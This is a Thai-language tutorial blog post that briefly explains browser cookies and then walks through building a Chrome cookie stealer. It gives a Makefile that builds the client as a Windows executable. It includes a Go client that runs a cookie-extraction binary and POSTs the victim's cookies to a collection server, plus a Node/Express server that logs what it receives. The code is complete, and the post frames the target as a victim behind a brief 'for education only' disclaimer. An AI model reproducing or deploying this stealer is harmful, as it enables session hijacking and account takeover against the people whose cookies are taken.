---
title: เคยสงสัยมั้ยครับว่าเราสามารถ ขโมยคุกกี้ได้ไหม🔥 ?
author: Cookie_crimes Projact
---

### ก่อนอื่น Cookie🍪 คืออะไร
คุณเคยสงสัยหรือไม่ว่าคุณจะลงชื่อเข้าใช้เว็บไซต์เพียงครั้งเดียวและยังคงลงชื่อเข้าใช้ได้อย่างไร แม้ว่าคุณจะปิดเบราว์เซอร์แล้วก็ตาม ไม่ว่าคุณจะรู้หรือไม่ก็ตาม คุกกี้มีอยู่ทุกหนทุกแห่ง
ในบทความนี้ เราจะพูดถึงประวัติของคุกกี้ วิธีทำงาน วิธีใช้งานคุกกี้ใน JavaScript และข้อกังวลด้านความปลอดภัยบางประการ

![sdasd](https://www.freecodecamp.org/news/content/images/2021/02/fireship-cookies.png)
### ประวัติย่อของคุกกี้🍪
คุกกี้ HTTP (Hypertext Transfer Protocol) เป็นข้อมูลชิ้นเล็กๆ ที่เซิร์ฟเวอร์ส่งไปยังเว็บเบราว์เซอร์ของผู้ใช้ เบราว์เซอร์อาจจัดเก็บและส่งกลับพร้อมกับคำขอในภายหลังไปยังเซิร์ฟเวอร์เดียวกัน
#### คุกกี้ส่วนใหญ่ใช้เพื่ออะไร📌 เช่น
1. การจัดการเซสชัน
 	- การเข้าสู่ระบบ ตะกร้าสินค้า คะแนนเกม หรือสิ่งอื่นใดที่เซิร์ฟเวอร์ควรจดจำ
1. การปรับแต่ง
	- ค่ากำหนด ธีม และการตั้งค่าอื่นๆ ของผู้ใช้
			
**ศึกษาเพื่มเติมเกียวกับคุกกี้🍪 [Read more](https://www.freecodecamp.org/news/everything-you-need-to-know-about-cookies-for-web-development/)**

### เอาล่ะตอนนี้เราพอได้รู้จัก Cookie แล้วต่อไปเราจะเข้าการ ขโมยคุกกี้กัน

**แต่ ⚠️ เราสร้างขึ้นเพื่อการ ศึกษา หากนำไปใช้ในทางที่ผิด เราจะไม่รับผิดชอบ**

**เข้าไปดู Source code ได้ที่ [Cookie_crimes](https://github.com/Kongthap-code/Cookie_crimes)**

**เราจะมี Directory หลักๆเลยคือ Client และ server**

### => ./Cookie_crimes
```js
client/
server/
```
* Directory client คือส่วนหน้าต่างของเหยือที่จะส่งข้อมูลมาให้ server
* Directory server คือส่วนที่รอรับ cookie จาก client

### => ./client
```js
src/
Makefile
main.go
```
ใน client ของเราก็จมี Makefile เอาไว้ทำอะไร ??? Makefile เอาไว้ Build file main.go เช่น Bulid ให้เป็น EXE ใช่ใน windows ลองดูตัวอย่างต่อไปนี้

### => ./Makefile
```makefile
buildwindows:
	GOOS=windows GOARCH=amd64 go build main.go

build:
	go build main.go
```
การเรียกใช้งาน Makefile ง่ายมากๆด้วยการพิมพ์ว่า
make ตามด้วยชื้อ เช่น make build
ต่อไปเราจะไปที่ src ก่อนใน src คือfileที่ใช้ในการ การสกัดคุกกี้ Chrome โดยไม่ต้องรูท

**สามารถดูเพื่มเติมได้ที่ [cookie_crimes](https://github.com/defaultnamehere/cookie_crimes)**

อย่างแรกที่เราควรทำเลย ไปที่ Makefile อย่างที่สอนไปตอนต้นเลยให้เรา build ทั้งหมดให้เป็น binary ให้เรา make binary
แล้วเราจะได้ file cookie_crimes มาfileเดียวใน Directory ./dist
ให้เราเข้าไปใน Directory ./dist แล้วนำ file cookie_crimes ออกมาจากsrc
### => ./client
```js
src/
+ cookie_crimes
main.go
```
ต่อไปเราจะไปดูในส่วนของ main.go
### => ./client/main.go
```go
package main

import (
	"log"
	"net/http"
	"os/exec"
)

func main() {
	cmd := exec.Command("./cookie_crimes")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatal(err)
	}

	if err := cmd.Start(); err != nil {
		log.Fatal(err)
	}

	if err != nil {
		log.Fatal(err)
	}

	resp, err := http.Post("http://localhost:8080", "application/json", stdout)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}
```
การทำงานของคำสั่ง
* import ให้ import "log" , "net/http" , "os/exec" เข้ามาในProjact
* สร้าง function main() ขึ้นมา
* ใน function main() ก็จะรั้นตัว ./cookie_crimes ที่เราbulidมา ./cookie_crimes จะดูดcookieทั้งหมดใน google chrome ไปเก็บใน stdout
*	แล้วทำการ fach ข้อมูลแบบ post ไป http://localhost:8080 **(http://localhost:8080", "application/json", stdout)** localhostก็จะรอรับ ข้อมูลจากเหยืออยู่นั้นเอง
ต่อไปเรา bulid file main.go ให้นำไปใช้จริงกันเถอ

พิมพ์ **make build**

แล้วเราจะได้ file cookie_crimes ที่พร้อมใช้งาน ถ้าเข้าโปรแกรมนี้ มันจะดูดcookieเราส่งไปที่ localhost หรือ dir ./server ที่จะทำต่อจากนี้
ต่อไปเราจะมา Directory server ซึ่งเป็น การสร้าง server เพื่อรอรับ cookie เหยือของเรา

เราใช่เป็น nodejs มาถึงเรา สร้างProjact node โดยเขียนตามคำสั่งนี้
```js
	npm init -y
```
แล้ว project ของเราก็จะเจอ File เพิ่มขึ้นมา 1 File ชื่อว่า package.json ซึ่ง file เนี้ยจะเป็นเหมือนกับบัตรประจำตัว project ของเราว่า project ของเราน่ะ ใช้ nodejs นะ มี command ให้ใช้ตามนี้นะ และต้องใช้ Library ต่างๆที่ระบุไว้ในนี้ ก่อนจะใช้งาน app นี้ก็ให้ลง Library พวกนี้ก่อนนะ ประมาณนี้น่ะครับ
### => ./server
```js
	+ package.json
```
![](https://twinsynergy.co.th/wp-content/uploads/2021/06/nodejs-express.png)
ต่อไปเราจะลง express และ body-parser กัน โดยเขียน
```js
	npm install express
	npm install body-parser
```
เสร็จแล้วเราก็สร้างfile index.jsึ้นมา
### => ./server
```js
	node_modules
	package.json
	package-lock.json
	+ index.js
```
ให้เข้าไป ที่ index.js
```js
const express = require("express");
const bodyParser = require("body-parser");

const App = express();

function Logger(ip, body) {
	console.log(`FROM ${ip}`);
	console.log(body);
}

App.use(express.json({ limit: "10mb"}));

App.post("/", (req,res) => {
	Logger(req.id, req.body);
	res.status(200).json({ status: "success" });
});

App.listen(8080, () => {
	console.log("Listening on " + 8080);
});
```
การทำงานของคำสั่ง
* สร้าง const express แล้ว require module เข้ามา
* สร้าง const bodyParser แล้ว require module เข้ามา
* const App กำหนดให้ใช้ express
* App.post("/"), (req,res) => {} รอรับข้อมูลจาก main.go แล้วแสดงผลออกมา
	
### เพียงเท่านี้ก็เสร็จหมดแล้ว
เป็นยังไงกันบ้างครับขอให้เขียน Code กันอย่างสนุกนะครับถ้าผมมีข่าวสารดีๆจะมาเขียนบทความให้นะครับขอบคุณครับ

อ่างอิง
**[cookie_crimes](https://github.com/defaultnamehere/cookie_crimes)**
